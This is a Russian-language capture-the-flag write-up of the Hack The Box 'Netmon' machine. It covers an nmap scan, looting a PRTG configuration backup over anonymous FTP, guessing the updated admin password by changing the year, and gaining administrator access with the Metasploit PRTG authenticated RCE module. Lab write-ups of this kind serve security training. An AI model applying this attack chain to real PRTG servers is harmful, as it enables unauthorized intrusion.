# 🟢 Netmon (Windows, Easy)

![](<../../../../.gitbook/assets/1 (1).png>)

### Содержание:

В самом начале мы сканируем порты и видим, что доступ к ftp открыт через anonymous, также мы сразу же можем прочитать флаг юзера. На 80 порту мы обнаруживаем PRTG Network Monitor. Мы можем найти файл PRTG Configuration.old.bak, где обнаружим следующие данные prtgadmin:PrTg@dmin2018. К сожалению, они не подходят. Выход следующий: это старый файл, т.е. это бэкап, машина вышла в 2019, а в пароле 2018, мы можем попробовать PrTg@dmin2019 в качестве пароля и он подойдет. Затем, мы используем эксплойт из метасплоита, который нам даст удаленный доступ с правами администратора.

### Сканируем порты с помощью nmap:

```
$ nmap -sC -sV 10.10.10.152 -oN nmap
```

```
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-01-30T22:14:04
|_  start_date: 2022-01-30T22:13:01
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5m18s, deviation: 0s, median: 5m18s
```

### Получаем флаг юзера и бэкап:

![](<../../../../.gitbook/assets/2 (1) (1).png>)

### Скачиваем и читаем бэкап:

Переходим через ftp по пути /ProgramData/Paessler/PRTG Network Monitor и качаем PRTG Configuration.old.bak:

```
ftp> mget "PRTG Configuration.old.bak"
```

В данном файле мы находим следующие креды:

```
prtgadmin:PrTg@dmin2018
```

### Включаем логику и подбираем пароль:

Пробуем авторизоваться на 80 порту и ничего не получается. Так как PRTG Configuration.old.bak - это старый файл, т.е. это бэкап, машина вышла в 2019, а в пароле 2018, мы можем попробовать PrTg@dmin2019 в качестве пароля и он подойдет.

### Используем эксплоит для получения RCE с правами администратора:

Теперь мы можем использовать данный эксплоит из метасплоита:

```
exploit/windows/http/prtg_authenticated_rce  2018-06-25       excellent  Yes    PRTG Network Monitor Authenticated RCE
```

Настраиваем его так:

![](<../../../../.gitbook/assets/3 (1) (1).png>)

Теперь мы имеем доступ от имени администратора и можем прочитать root.txt:

![](<../../../../.gitbook/assets/4 (1).png>)
